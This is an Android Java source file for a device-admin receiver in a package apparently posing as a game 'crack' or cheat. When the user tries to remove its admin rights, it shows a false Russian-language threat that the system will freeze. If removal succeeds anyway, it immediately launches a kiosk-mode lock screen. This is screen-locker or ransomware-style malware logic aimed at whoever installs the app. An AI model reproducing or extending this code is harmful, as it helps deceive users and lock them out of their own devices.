package com.elysium.crack;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "ВНИМАНИЕ! Инжект чита заблокирован. Попытка отключения приведет к зависанию системы!";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Если админа все-таки вырубили, моментально запускаем киоск
        Intent i = new Intent(context, KioskActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        context.startActivity(i);
    }
}